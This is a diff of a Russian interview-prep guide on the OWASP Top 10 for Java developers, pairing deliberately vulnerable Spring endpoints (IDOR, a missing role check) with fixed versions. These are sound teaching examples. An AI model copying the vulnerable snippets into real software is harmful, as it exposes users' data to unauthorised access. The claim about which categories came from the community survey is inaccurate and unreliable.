@@ -1,1475 +1,1917 @@
 ---
 title: "Вопросы на собеседовании: OWASP Top 10"
-description: "Комплексное руководство по вопросам собеседования на тему OWASP Top 10 для Senior Java Developer. Включает детальные объяснения концепций, практические примеры угроз и mitigations для web/API-систем, best practices и troubleshooting."
-tags: ["interview", "security", "owasp-top10-interview"]
+description: "Подробные вопросы и ответы по всем 10 категориям OWASP Top 10 2021 для Senior Java Developer: Broken Access Control, Cryptographic Failures, Injection, Insecure Design, Security Misconfiguration, Vulnerable Components, Auth Failures, Data Integrity Failures, Logging Failures, SSRF"
+tags:
+  - interview
+  - security
+  - owasp-top10-interview
 difficulty: "intermediate"
-prerequisites: []
-next: []
-updated: "2026-02-11"
+aliases:
+  - "OWASP Top 10 interview"
+  - "OWASP Top 10 собеседование"
+  - "OWASP interview questions"
+  - "веб-безопасность собеседование"
+updated: "2026-04-13"
 ---
 # Вопросы на собеседовании: `OWASP Top 10`
 
-Комплексное руководство по вопросам собеседования на тему `OWASP Top 10` для `Senior Java Developer`. Включает детальные объяснения концепций, практические примеры угроз и mitigations для `web/API`-систем, best practices и troubleshooting.
+Подробные вопросы и ответы по всем 10 категориям `OWASP Top 10 2021` для `Senior Java Developer`. Покрывает каждую категорию в глубину: от теории и типичных уязвимостей до практических примеров кода (уязвимый → исправленный) и архитектурных решений.
 
-Дата последнего обновления: 2026-02-11
+Дата последнего обновления: 2026-04-13
 
-Краткое введение: OWASP Top 10 для Senior Java Developer.
+**`OWASP Top 10`** — стандартный список наиболее критичных рисков безопасности веб-приложений, составляемый `Open Web Application Security Project`. Версия 2021 года включает новые категории (`Insecure Design`, `Software and Data Integrity Failures`, `SSRF`) и переосмысляет ранжирование на основе реальных инцидентов.
 
 ## Полезные ссылки
 
 ### Официальная документация
 
-- [OWASP Top 10 2021](https://owasp.org/Top10/)
-- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
-- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
-- [Spring Security Documentation](https://docs.spring.io/spring-security/reference/)
-
-### См. также
-
-- [`application-security-interview.md`](application-security-interview.md) — общая безопасность приложений
-- [`../frameworks/spring/spring-security-interview.md`](../frameworks/spring/spring-security-interview.md) — Spring Security
+- [OWASP Top 10 2021](https://owasp.org/Top10/) — официальный список категорий с описанием
+- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/) — практические рекомендации по каждой категории
+- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) — методология тестирования безопасности
+- [Spring Security Reference](https://docs.spring.io/spring-security/reference/) — безопасность в `Spring` экосистеме
+- [CWE/SANS Top 25](https://cwe.mitre.org/top25/) — смежная классификация уязвимостей
+- [SQL Injection and How to Prevent It?](https://www.baeldung.com/sql-injection) — SQL-инъекции и защита в Java
+- [Prevent Cross-Site Scripting (XSS) in a Spring Application](https://www.baeldung.com/spring-prevent-xss) — защита от XSS в Spring
+- [Sanitize HTML Code to Prevent XSS Attacks](https://www.baeldung.com/java-sanitize-html-prevent-xss-attacks) — санитизация HTML в Java
+- [Content Security Policy with Spring Security](https://www.baeldung.com/spring-security-csp) — CSP-заголовки в Spring Security
 
 ## Содержание
 
 - [Полезные ссылки](#полезные-ссылки)
+- [See also](#see-also)
 
-**Ключевые вопросы по OWASP Top 10**
-- [Q1. Что такое OWASP Top 10 и как его использовать на практике?](#q1-что-такое-owasp-top-10-и-как-его-использовать-на-практике)
-- [Q2. Что такое Broken Access Control (A01) и как от него защищаться?](#q2-что-такое-broken-access-control-a01-и-как-от-него-защищаться)
-- [Q3. Что включает Cryptographic Failures (A02)?](#q3-что-включает-cryptographic-failures-a02)
-- [Q4. Чем опасны Injection-уязвимости (A03)?](#q4-чем-опасны-injection-уязвимости-a03)
-- [Q5. Что значит Insecure Design (A04)?](#q5-что-значит-insecure-design-a04)
-- [Q6. Как проявляется Security Misconfiguration (A05)?](#q6-как-проявляется-security-misconfiguration-a05)
-- [Q7. Что такое Vulnerable and Outdated Components (A06)?](#q7-что-такое-vulnerable-and-outdated-components-a06)
-- [Q8. Что включают Identification and Authentication Failures (A07)?](#q8-что-включают-identification-and-authentication-failures-a07)
-- [Q9. Что такое Software and Data Integrity Failures (A08)?](#q9-что-такое-software-and-data-integrity-failures-a08)
-- [Q10. Почему Security Logging and Monitoring Failures (A09) критичны?](#q10-почему-security-logging-and-monitoring-failures-a09-критичны)
-- [Q11. Что такое SSRF (A10) и как его закрывать?](#q11-что-такое-ssrf-a10-и-как-его-закрывать)
-- [Q12. Как встроить OWASP-проверки в SDLC и CI/CD?](#q12-как-встроить-owasp-проверки-в-sdlc-и-cicd)
-- [Q13. Какие security-тесты обязательны перед релизом?](#q13-какие-security-тесты-обязательны-перед-релизом)
-- [Q14. Как организовать безопасный секрет-менеджмент в приложении?](#q14-как-организовать-безопасный-секрет-менеджмент-в-приложении)
-- [Q15. Как приоритизировать исправление уязвимостей по риску?](#q15-как-приоритизировать-исправление-уязвимостей-по-риску)
+**Общие вопросы по OWASP Top 10**
+- [Q1. (!) Что такое OWASP Top 10 и зачем он нужен разработчику?](#q1--что-такое-owasp-top-10-и-зачем-он-нужен-разработчику)
+- [Q2. Какие изменения произошли в OWASP Top 10 2021 по сравнению с 2017?](#q2-какие-изменения-произошли-в-owasp-top-10-2021-по-сравнению-с-2017)
+- [Q3. Как OWASP оценивает риск каждой категории?](#q3-как-owasp-оценивает-риск-каждой-категории)
 
-## Q1. Что такое OWASP Top 10 и как его использовать на практике?
+**A01: Broken Access Control**
+- [Q4. (!) Что такое Broken Access Control и почему это категория №1?](#q4--что-такое-broken-access-control-и-почему-это-категория-1)
+- [Q5. (!) Что такое IDOR и как от него защищаться?](#q5--что-такое-idor-и-как-от-него-защищаться)
+- [Q6. Чем отличается вертикальная эскалация привилегий от горизонтальной?](#q6-чем-отличается-вертикальная-эскалация-привилегий-от-горизонтальной)
+- [Q7. Как реализовать deny-by-default авторизацию в Spring Security?](#q7-как-реализовать-deny-by-default-авторизацию-в-spring-security)
 
-OWASP Top 10 — это перечень наиболее распространённых и критичных классов уязвимостей веб-приложений. Это не исчерпывающий стандарт, а приоритизированная модель рисков, которая помогает команде сфокусироваться на самых вероятных и дорогих с точки зрения последствий проблемах.
+**A02: Cryptographic Failures**
+- [Q8. (!) Какие типичные криптографические ошибки допускают разработчики?](#q8--какие-типичные-криптографические-ошибки-допускают-разработчики)
+- [Q9. Как правильно хранить пароли в Java-приложении?](#q9-как-правильно-хранить-пароли-в-java-приложении)
+- [Q10. Как правильно использовать AES-GCM для шифрования данных?](#q10-как-правильно-использовать-aes-gcm-для-шифрования-данных)
 
-Практически OWASP используют как чек-лист на этапах проектирования, code review, тестирования и релиза. Лучший эффект достигается, когда требования OWASP встроены в инженерные процессы, а не проверяются «один раз перед продом».
+**A03: Injection**
+- [Q11. (!) Какие виды Injection-атак существуют и как от них защищаться?](#q11--какие-виды-injection-атак-существуют-и-как-от-них-защищаться)
+- [Q12. (!) Как SQL Injection работает через Spring Data JPA и JDBC?](#q12--как-sql-injection-работает-через-spring-data-jpa-и-jdbc)
+- [Q13. Что такое XSS и как от него защищаться на бэкенде?](#q13-что-такое-xss-и-как-от-него-защищаться-на-бэкенде)
+- [Q14. Что такое Command Injection и как его предотвратить?](#q14-что-такое-command-injection-и-как-его-предотвратить)
 
-## Q2. Что такое Broken Access Control (A01) и как от него защищаться?
+**A04: Insecure Design**
+- [Q15. (!) Чем Insecure Design отличается от implementation-багов?](#q15--чем-insecure-design-отличается-от-implementation-багов)
+- [Q16. Что такое threat modeling и как его применять?](#q16-что-такое-threat-modeling-и-как-его-применять)
+- [Q17. Какие secure design patterns должен знать Java-разработчик?](#q17-какие-secure-design-patterns-должен-знать-java-разработчик)
 
-Broken Access Control — это нарушения авторизационной модели, когда пользователь получает доступ к данным или операциям, на которые у него нет прав. Частые примеры: IDOR, вертикальная/горизонтальная эскалация прав, отсутствие проверки ownership.
+**A05: Security Misconfiguration**
+- [Q18. (!) Какие типичные ошибки конфигурации безопасности встречаются в Spring Boot?](#q18--какие-типичные-ошибки-конфигурации-безопасности-встречаются-в-spring-boot)
+- [Q19. Как правильно настроить security headers?](#q19-как-правильно-настроить-security-headers)
+- [Q20. Как разделить конфигурацию между dev и prod?](#q20-как-разделить-конфигурацию-между-dev-и-prod)
 
-Базовая защита: deny-by-default, централизованная авторизация на уровне бизнес-логики, проверка владельца ресурса и ролей, а также аудит отказов доступа. Проверки только на уровне UI недостаточны.
+**A06: Vulnerable and Outdated Components**
+- [Q21. (!) Как выявлять и управлять уязвимыми зависимостями?](#q21--как-выявлять-и-управлять-уязвимыми-зависимостями)
+- [Q22. Что такое SBOM и зачем он нужен?](#q22-что-такое-sbom-и-зачем-он-нужен)
+- [Q23. Как организовать SCA в CI/CD pipeline?](#q23-как-организовать-sca-в-cicd-pipeline)
 
-## Q3. Что включает Cryptographic Failures (A02)?
+**A07: Identification and Authentication Failures**
+- [Q24. (!) Какие ошибки аутентификации наиболее опасны?](#q24--какие-ошибки-аутентификации-наиболее-опасны)
+- [Q25. Как защититься от brute force и credential stuffing?](#q25-как-защититься-от-brute-force-и-credential-stuffing)
+- [Q26. Как безопасно управлять JWT-токенами?](#q26-как-безопасно-управлять-jwt-токенами)
 
-Класс A02 покрывает ошибки в шифровании и работе с чувствительными данными: слабые алгоритмы, неправильное хранение ключей, отсутствие шифрования каналов или данных at rest, небезопасные режимы использования криптографии.
+**A08: Software and Data Integrity Failures**
+- [Q27. (!) Что такое supply-chain атаки и как от них защищаться?](#q27--что-такое-supply-chain-атаки-и-как-от-них-защищаться)
+- [Q28. Чем опасна небезопасная десериализация в Java?](#q28-чем-опасна-небезопасная-десериализация-в-java)
+- [Q29. Как защитить CI/CD pipeline от компрометации?](#q29-как-защитить-cicd-pipeline-от-компрометации)
 
-Ключевые меры: современные алгоритмы (AES-GCM, TLS 1.2+), секреты в vault/secret-manager, корректная ротация ключей, отказ от самописной криптографии. Важно защищать весь жизненный цикл данных, а не только «место хранения».
+**A09: Security Logging and Monitoring Failures**
+- [Q30. (!) Что должна включать стратегия security-логирования?](#q30--что-должна-включать-стратегия-security-логирования)
+- [Q31. Какие события безопасности обязательно логировать?](#q31-какие-события-безопасности-обязательно-логировать)
+- [Q32. Как настроить алертинг на security-события?](#q32-как-настроить-алертинг-на-security-события)
 
-## Q4. Чем опасны Injection-уязвимости (A03)?
+**A10: Server-Side Request Forgery (SSRF)**
+- [Q33. (!) Что такое SSRF и почему он попал в OWASP Top 10?](#q33--что-такое-ssrf-и-почему-он-попал-в-owasp-top-10)
+- [Q34. Как реализовать защиту от SSRF в Java?](#q34-как-реализовать-защиту-от-ssrf-в-java)
 
-Injection возникает, когда недоверенный ввод попадает в интерпретатор команд/запросов без безопасной обработки. Это может привести к чтению/изменению данных, удалённому выполнению команд или обходу бизнес-ограничений.
+**Практика и процессы**
+- [Q35. (!) Как встроить OWASP-проверки в SDLC и CI/CD?](#q35--как-встроить-owasp-проверки-в-sdlc-и-cicd)
+- [Q36. Какие security-тесты обязательны перед релизом?](#q36-какие-security-тесты-обязательны-перед-релизом)
+- [Q37. Как организовать безопасный секрет-менеджмент?](#q37-как-организовать-безопасный-секрет-менеджмент)
+- [Q38. Как приоритизировать исправление уязвимостей?](#q38-как-приоритизировать-исправление-уязвимостей)
+- [Q39. Что такое Defense in Depth и как применять на практике?](#q39-что-такое-defense-in-depth-и-как-применять-на-практике)
+- [Q40. Как подготовиться к вопросам по OWASP на собеседовании?](#q40-как-подготовиться-к-вопросам-по-owasp-на-собеседовании)
 
-Защита: параметризованные запросы, строгая валидация ввода, экранирование в контекстах вывода и принцип минимальных привилегий. Дополнительно нужны security-тесты на SQL/NoSQL/Command injection в CI.
+**Углублённые вопросы**
+- [Q41. (!) Как реализовать Path Traversal защиту в Java?](#q41--как-реализовать-path-traversal-защиту-в-java)
+- [Q42. Что такое XXE и как защититься в Java?](#q42-что-такое-xxe-и-как-защититься-в-java)
+- [Q43. (!) Как безопасно обрабатывать загрузку файлов в Spring Boot?](#q43--как-безопасно-обрабатывать-загрузку-файлов-в-spring-boot)
+- [Q44. Как работает Log4Shell и почему это критично?](#q44-как-работает-log4shell-и-почему-это-критично)
+- [Q45. Как реализовать безопасную работу с Cryptographic Keys в Java?](#q45-как-реализовать-безопасную-работу-с-cryptographic-keys-в-java)
 
-## Q5. Что значит Insecure Design (A04)?
+---
 
-Insecure Design — это архитектурные и продуктовые решения, где безопасность не заложена в модель угроз и бизнес-процессы. Даже идеальная реализация не спасает, если сам дизайн допускает опасные сценарии.
+## Q1. (!) Что такое OWASP Top 10 и зачем он нужен разработчику?
 
-Для снижения риска нужны threat modeling, misuse-cases, security acceptance criteria и review архитектуры до начала реализации. Исправлять дизайн после релиза обычно дороже, чем предотвращать проблемы на этапе проектирования.
+`OWASP Top 10` — это приоритизированный список наиболее критичных классов уязвимостей веб-приложений, составляемый `Open Web Application Security Project` на основе анализа реальных инцидентов. Обновляется каждые 3-4 года; текущая версия — **2021**.
 
-## Q6. Как проявляется Security Misconfiguration (A05)?
+Это **не стандарт** и не исчерпывающий чек-лист, а **модель рисков**, которая помогает команде сфокусироваться на самых вероятных и дорогих проблемах. Для разработчика OWASP Top 10 — это:
 
-A05 включает ошибки конфигурации: открытые debug endpoint-ы, небезопасные дефолты, лишние права сервисов, некорректные CORS/headers, утечки административных интерфейсов наружу. Это одна из самых частых причин инцидентов в проде.
+1. **Язык коммуникации** с security-командой и заказчиком
+2. **Чек-лист** на code review, при проектировании и перед релизом
+3. **Базовый минимум** — если вы не покрываете эти 10 категорий, всё остальное бессмысленно
+4. **Маппинг на CWE** — каждая категория связана с конкретными `Common Weakness Enumeration`
 
-Защита строится на hardening baseline, инфраструктуре как коде, регулярных проверках конфигов и окружений. Важно проверять не только приложение, но и контейнеры, оркестратор, ingress и cloud-настройки.
+> **Что хотят услышать на собеседовании**: не просто перечисление 10 пунктов, а понимание того, как OWASP используется в реальном SDLC — от design review до CI/CD quality gates.
 
-## Q7. Что такое Vulnerable and Outdated Components (A06)?
+## Q2. Какие изменения произошли в OWASP Top 10 2021 по сравнению с 2017?
 
-A06 — это использование библиотек, фреймворков и runtime-компонентов с известными CVE. Проблема часто возникает транзитивно: уязвимость приходит через зависимость зависимости и долго остаётся незамеченной.
+Версия 2021 принесла три новых категории и существенную перегруппировку:
 
-Практика: SCA-сканирование в CI, SBOM, политика обновлений и контроль критичных CVE по SLA. Нужна не только «автоматическая проверка», но и процесс оперативного патча с регрессионным тестом.
+| # | 2017 | 2021 | Изменение |
+|---|------|------|-----------|
+| A01 | `Injection` | `Broken Access Control` | Поднялся с 5-го места |
+| A02 | `Broken Authentication` | `Cryptographic Failures` | Расширен от аутентификации до всей криптографии |
+| A03 | `Sensitive Data Exposure` | `Injection` | Опустился с 1-го места |
+| A04 | `XXE` | **`Insecure Design`** | **Новая категория** |
+| A05 | `Broken Access Control` | `Security Misconfiguration` | Поглотил `XXE` |
+| A06 | `Security Misconfiguration` | `Vulnerable Components` | Поднялся |
+| A07 | `XSS` | `Auth Failures` | `XSS` вошёл в `Injection` |
+| A08 | `Insecure Deserialization` | **`Integrity Failures`** | **Новая**, поглотила десериализацию |
+| A09 | `Using Components with Known Vulns` | `Logging Failures` | — |
+| A10 | `Insufficient Logging` | **`SSRF`** | **Новая категория** |
 
-## Q8. Что включают Identification and Authentication Failures (A07)?
+Ключевые наблюдения:
+- **`Broken Access Control`** стал №1 — он найден в 94% приложений при тестировании
+- **`Insecure Design`** подчёркивает, что secure coding без secure design недостаточно
+- **`SSRF`** отражает рост cloud-инфраструктуры и атак на metadata endpoints
 
-Класс A07 покрывает ошибки аутентификации и управления сессиями: слабая политика паролей, отсутствие MFA, уязвимые recovery-процессы, плохое управление токенами и session fixation.
+## Q3. Как OWASP оценивает риск каждой категории?
 
-Сильный минимум: MFA для критичных операций, rate limiting и lockout, безопасные cookie/token-практики, короткоживущие токены и корректная инвалидация сессий. Аутентификация должна рассматриваться как процесс, а не как «один endpoint логина».
+Каждая категория оценивается по формуле: **`Risk = Likelihood × Impact`**, где:
 
-## Q9. Что такое Software and Data Integrity Failures (A08)?
+- **`Likelihood`** складывается из `Threat Agent`, `Vulnerability Prevalence` и `Detectability`
+- **`Impact`** включает `Technical Impact` и `Business Impact`
 
-A08 связан с доверием к коду, обновлениям и данным: неподписанные артефакты, компрометация CI/CD, небезопасная десериализация и supply-chain атаки. Угроза затрагивает не только runtime, но и pipeline поставки.
+```mermaid
+graph LR
+    A[Threat Agent] --> D[Likelihood]
+    B[Vulnerability<br/>Prevalence] --> D
+    C[Detectability] --> D
+    D --> G[Risk]
+    E[Technical<br/>Impact] --> F[Impact]
+    F --> G
+```
 
-Защита: подпись артефактов, проверка происхождения зависимостей, изоляция CI, policy enforcement, контроль integrity на этапе деплоя. Нужно защищать цепочку поставки end-to-end.
+На практике OWASP Top 10 2021 использует данные из:
+- **Анализа CVE** и инцидентов (data-driven для 8 категорий)
+- **Опроса экспертов** (community survey для 3 категорий: `Insecure Design`, `SSRF`, `Integrity Failures`)
 
-## Q10. Почему Security Logging and Monitoring Failures (A09) критичны?
+---
 
-Если событие атаки не записано или не алертится, команда узнаёт об инциденте слишком поздно. A09 часто превращает «локальную проблему» в крупный breach, потому что не работает раннее обнаружение и расследование.
+## Q4. (!) Что такое Broken Access Control и почему это категория №1?
 
-Нужны структурированные security-логи, корреляция по trace/correlation id, адекватный retention и проверяемые алерты. Логирование без процесса реагирования почти бесполезно.
+`Broken Access Control` (`A01:2021`) — нарушение контроля доступа, когда пользователь может получить доступ к ресурсам или выполнить операции, на которые у него нет прав. Стал №1, потому что обнаруживается в **94% протестированных приложений**.
 
-## Q11. Что такое SSRF (A10) и как его закрывать?
+Типичные проявления:
+- **`IDOR`** — прямая ссылка на объект без проверки владельца
+- **Вертикальная эскалация** — обычный пользователь вызывает admin-эндпоинт
+- **Горизонтальная эскалация** — пользователь A видит данные пользователя B
+- **Обход проверок** — манипуляция с путями, HTTP-методами, параметрами
+- **`CORS` misconfiguration** — доступ с неавторизованного origin
 
-SSRF позволяет злоумышленнику заставить сервер ходить по произвольным URL, включая внутренние сервисы и metadata endpoints. Это часто используется как шаг для lateral movement внутри инфраструктуры.
+```mermaid
+graph TD
+    A[Пользователь] --> B{Авторизация}
+    B -->|Проверена| C[Доступ к своему ресурсу]
+    B -->|НЕ проверена| D[IDOR / Эскалация]
+    D --> E[Чужие данные]
+    D --> F[Admin-функции]
+    D --> G[Удаление/изменение]
+```
 
-Основные меры: allowlist хостов/схем, запрет private network ranges, egress-фильтрация на сетевом уровне и строгие таймауты/лимиты ответа. Одной валидации строки URL недостаточно без сетевых ограничений.
+Принцип защиты — **deny-by-default** на каждом уровне: контроллер, сервис, база данных. Подробнее о паттернах авторизации — в [вопросах по авторизации](authentication-authorization-patterns-interview.md).
 
-## Q12. Как встроить OWASP-проверки в SDLC и CI/CD?
+## Q5. (!) Что такое IDOR и как от него защищаться?
 
-OWASP-риски должны покрываться не только пентестом, но и регулярными автоматическими проверками в pipeline: SAST, SCA, secret scan, IaC scan, DAST на staging. Это даёт раннюю обратную связь и снижает стоимость исправления.
+`IDOR` (`Insecure Direct Object Reference`) — атака, при которой злоумышленник подменяет идентификатор объекта в запросе и получает доступ к чужим данным.
 
-Важно определить quality gates по severity и policy exceptions с явным владельцем риска. Иначе сканеры дают отчёты, но не влияют на реальное качество релиза.
-
-## Q13. Какие security-тесты обязательны перед релизом?
-
-Минимальный набор обычно включает аутентификацию/авторизацию (positive+negative), инъекции, конфигурационные проверки, проверку секретов и базовые abuse-сценарии. Для критичных систем добавляют threat-based тесты по наиболее вероятным атакам.
-
-Хорошая практика — иметь regression-набор security-тестов, который запускается автоматически на каждом релизном кандидате. Это снижает риск повторного появления уже закрытых уязвимостей.
-
-## Q14. Как организовать безопасный секрет-менеджмент в приложении?
-
-Секреты не должны храниться в коде, репозитории или образах контейнера. Их размещают в специализированных хранилищах (Vault, cloud secret managers), с ротацией, аудитом доступа и принципом least privilege.
-
-На уровне приложения важно минимизировать время жизни секретов в памяти, не логировать их и разделять доступ по окружениям/ролям. Секрет-менеджмент — это часть архитектуры, а не только DevOps-задача.
-
-## Q15. Как приоритизировать исправление уязвимостей по риску?
-
-Приоритет определяется не только CVSS, но и бизнес-контекстом: эксплуатируемость, доступность атаки, критичность актива, наличие компенсирующих мер и blast radius. Иногда «средняя» уязвимость в публичном сервисе важнее «высокой» во внутреннем сегменте.
-
-Практичный подход — risk-based backlog с SLA по severity и owner на каждую запись. Это помогает управлять безопасностью как непрерывным процессом и делает решение по рискам прозрачным для бизнеса.
-
-
-## Введение в `OWASP Top 10`
-
-`OWASP Top 10` — это стандартный список наиболее критичных рисков безопасности веб-приложений, составляемый `Open Web Application Security Project` (`OWASP`). Список обновляется каждые 3-4 года на основе анализа реальных инцидентов безопасности.
-
-### Почему `OWASP Top 10` важен?
-
-1. Фокус на реальных угрозах: Основан на анализе реальных атак
-2. Приоритизация: Помогает фокусироваться на наиболее опасных уязвимостях
-3. Методология: Предоставляет `CWE` mappings и detection methods
-4. Обновления: Регулярно обновляется для отражения текущих угроз
-
-### `OWASP Risk Rating Methodology`
-
-Каждая уязвимость оценивается по формуле: `Risk` = `Likelihood` × `Impact`
-
-Где:
-- `Likelihood` = `Threat Agent` × `Vulnerability` × `Technical Impact`
-- `Impact` = `Technical Impact` × `Business Impact`
-
-## A01:2021 Broken Access Control
-
-Нарушение контроля доступа — это ситуация, когда пользователь может получить доступ к ресурсам или выполнить действия, на которые у него нет прав.
-
-### Распространенные проблемы
-
-#### 1. URL-based Access Control Bypass
-
-Уязвимый код:
+**Уязвимый код:**
 ```java
-// Плохо: Нет проверки прав доступа
-@GetMapping("/api/users/{id}")
-public User getUser(@PathVariable Long id) {
- return userRepository.findById(id).orElseThrow();
+// Нет проверки ownership — любой аутентифицированный пользователь
+// может получить данные любого аккаунта, подменив accountId
+@GetMapping("/api/accounts/{accountId}")
+public Account getAccount(@PathVariable Long accountId) {
+    return accountRepository.findById(accountId).orElseThrow();
 }
 ```
 
-Исправленный код:
+**Исправленный код:**
 ```java
-@GetMapping("/api/users/{id}")
-public User getUser(@PathVariable Long id, @AuthenticationPrincipal User currentUser) {
- // Проверка: пользователь может видеть только свои данные или имеет роль ADMIN
- if (!currentUser.getId().equals(id) &&!currentUser.hasRole("ADMIN")) {
- throw new AccessDeniedException("Access denied");
- }
- return userRepository.findById(id).orElseThrow();
+@GetMapping("/api/accounts/{accountId}")
+public Account getAccount(@PathVariable Long accountId,
+                          @AuthenticationPrincipal UserDetails user) {
+    Account account = accountRepository.findById(accountId)
+            .orElseThrow(() -> new ResourceNotFoundException("Account not found"));
+    
+    // Проверка: пользователь — владелец или admin
+    if (!account.getOwnerId().equals(user.getId()) 
+            && !user.hasAuthority("ROLE_ADMIN")) {
+        throw new AccessDeniedException("Not authorized to access this account");
+    }
+    return account;
 }
 ```
 
-#### 2. `Privilege Escalation`
-
-Пример атаки:
-
-```http
-GET /api/admin/users HTTP/1.1
-Cookie: session=regular_user_session
-```
-Злоумышленник пытается получить доступ к административным функциям. #### 3. `IDOR` (`Insecure Direct Object References`)
-
-Уязвимый код:
+**Ещё надёжнее** — фильтрация на уровне запроса к БД:
 ```java
-@PostMapping("/api/accounts/{accountId}/transfer")
-public void transfer(@PathVariable Long accountId, @RequestBody TransferRequest request) {
- Account account = accountRepository.findById(accountId).orElseThrow();
- // Нет проверки принадлежности аккаунта пользователю!
- transferService.transfer(account, request.getToAccount(), request.getAmount());
+@Query("SELECT a FROM Account a WHERE a.id = :id AND a.ownerId = :ownerId")
+Optional<Account> findByIdAndOwnerId(@Param("id") Long id, 
+                                      @Param("ownerId") Long ownerId);
+```
+
+Дополнительные меры:
+- Использовать **`UUID`** вместо sequential `Long` для идентификаторов — усложняет перебор
+- Централизовать проверку ownership в **`PermissionEvaluator`** (см. [Spring Security](../frameworks/spring/spring-security-interview.md))
+- Добавить **`Row Level Security`** на уровне БД как defense in depth
+
+## Q6. Чем отличается вертикальная эскалация привилегий от горизонтальной?
+
+| Тип | Описание | Пример |
+|-----|----------|--------|
+| **Вертикальная** | Пользователь получает доступ к функциям более высокой роли | Обычный пользователь вызывает `DELETE /api/admin/users/42` |
+| **Горизонтальная** | Пользователь получает доступ к данным другого пользователя той же роли | Пользователь A читает заказы пользователя B через `GET /api/orders/999` |
+
+**Вертикальная** — обычно ошибка в конфигурации маршрутов или отсутствие `@PreAuthorize`:
+
+```java
+// Уязвимо: эндпоинт доступен всем аутентифицированным пользователям
+@DeleteMapping("/api/admin/users/{id}")
+public void deleteUser(@PathVariable Long id) {
+    userService.delete(id);
+}
+
+// Исправлено: явное ограничение по роли
+@PreAuthorize("hasRole('ADMIN')")
+@DeleteMapping("/api/admin/users/{id}")
+public void deleteUser(@PathVariable Long id) {
+    userService.delete(id);
 }
 ```
 
-### Защита от `Broken Access Control`
+**Горизонтальная** — более коварная, потому что стандартный RBAC её не ловит. Нужна проверка ownership на уровне бизнес-логики (см. Q5).
 
-#### 1. `Role-Based Access Control` (`RBAC`)
+## Q7. Как реализовать deny-by-default авторизацию в Spring Security?
+
+Принцип `deny-by-default` означает: всё, что явно не разрешено — запрещено. В `Spring Security` это реализуется через `SecurityFilterChain`:
 
 ```java
 @Configuration
-@EnableGlobalMethodSecurity(prePostEnabled = true)
-public class SecurityConfig extends WebSecurityConfigurerAdapter {
-
- @Override
- protected void configure(HttpSecurity http) throws Exception {
- http.authorizeRequests().antMatchers("/api/admin/").hasRole("ADMIN").antMatchers("/api/user/").hasAnyRole("USER", "ADMIN").anyRequest().authenticated();
- }
-}
-
-@RestController
-@RequestMapping("/api/accounts")
-public class AccountController {
-
- @PreAuthorize("hasRole('ADMIN') or #account.ownerId == authentication.principal.id")
- @GetMapping("/{id}")
- public Account getAccount(@PathVariable Long id) {
- return accountRepository.findById(id).orElseThrow();
- }
-}
-```
-
-#### 2. `Attribute-Based Access Control` (`ABAC`)
-
-```java
-@Component
-public class AccountPermissionEvaluator implements PermissionEvaluator {
-
- @Override
- public boolean hasPermission(Authentication authentication, Object targetDomainObject, Object permission) {
- if (targetDomainObject instanceof Account) {
- Account account = (Account) targetDomainObject;
- User user = (User) authentication.getPrincipal();
-
- // Пользователь может видеть аккаунт если он владелец или админ
- return account.getOwnerId().equals(user.getId()) || user.hasRole("ADMIN");
- }
- return false;
- }
-}
-```
-
-#### 3. `Defense in Depth`
-
-- `URL Protection`: Защищайте URLs на уровне контроллеров
-- `Service Layer Security`: Проверяйте права на уровне сервисов
-- `Data Layer Security`: Используйте Row `Level Security` в БД
-
-## A02:2021 Cryptographic Failures
-
-Криптографические неудачи включают проблемы с шифрованием, неправильное использование криптографических функций и слабые алгоритмы. ### Распространенные проблемы
-
-#### 1. Хранение паролей в открытом виде
-
-Уязвимый код:
-```java
-// НИКОГДА НЕ ДЕЛАЙТЕ ТАК!
-user.setPassword(request.getPassword());
-userRepository.save(user);
-```
-
-#### 2. Использование устаревших алгоритмов
-
-Уязвимые алгоритмы:
-- `MD5`, `SHA-1` для хэширования паролей
-- `DES`, 3DES для шифрования
-- `RC4 stream` cipher
-
-#### 3. Неправильное использование `HTTPS`
-
-Проблемы:
-- Смешивание `HTTP` и `HTTPS`
-- Не проверка `SSL` сертификатов
-- Использование `self-signed` сертификатов в production
-
-### Защита от `Cryptographic Failures`
-
-#### 1. Безопасное хранение паролей
-
-```java
-@Service
-public class PasswordService {
-
- private final PasswordEncoder passwordEncoder = new BCryptPasswordEncoder();
-
- public String encodePassword(String rawPassword) {
- return passwordEncoder.encode(rawPassword);
- }
-
- public boolean matches(String rawPassword, String encodedPassword) {
- return passwordEncoder.matches(rawPassword, encodedPassword);
- }
-}
-
-// Настройка в Spring Security
-@Configuration
+@EnableMethodSecurity
 public class SecurityConfig {
 
- @Bean
- public PasswordEncoder passwordEncoder() {
- return new BCryptPasswordEncoder(12); // strength = 12
- }
+    @Bean
+    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
+        http
+            .authorizeHttpRequests(auth -> auth
+                // Явно разрешённые пути
+                .requestMatchers("/api/public/**", "/health").permitAll()
+                .requestMatchers("/api/admin/**").hasRole("ADMIN")
+                // ВСЁ ОСТАЛЬНОЕ — запрещено
+                .anyRequest().authenticated()
+            )
+            .csrf(csrf -> csrf
+                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
+            )
+            .sessionManagement(session -> session
+                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
+            );
+        return http.build();
+    }
 }
 ```
 
-#### 2. Современные алгоритмы шифрования
-
-```java
-public class EncryptionUtils {
-
- private static final String ALGORITHM = "AES/GCM/NoPadding";
- private static final int KEY_SIZE = 256;
- private static final int IV_SIZE = 12; // 96 bits для GCM
-
- public static SecretKey generateKey() throws Exception {
- KeyGenerator keyGen = KeyGenerator.getInstance("AES");
- keyGen.init(KEY_SIZE);
- return keyGen.generateKey();
- }
-
- public static String encrypt(String data, SecretKey key) throws Exception {
- Cipher cipher = Cipher.getInstance(ALGORITHM);
- byte[] iv = new byte[IV_SIZE];
- new SecureRandom().nextBytes(iv);
-
- GCMParameterSpec parameterSpec = new GCMParameterSpec(128, iv);
- cipher.init(Cipher.ENCRYPT_MODE, key, parameterSpec);
-
- byte[] encryptedData = cipher.doFinal(data.getBytes());
-
- // Префикс с IV для дешифрования
- byte[] combined = new byte[iv.length + encryptedData.length];
- System.arraycopy(iv, 0, combined, 0, iv.length);
- System.arraycopy(encryptedData, 0, combined, iv.length, encryptedData.length);
-
- return Base64. getEncoder().encodeToString(combined);
- }
-
- public static String decrypt(String encryptedData, SecretKey key) throws Exception {
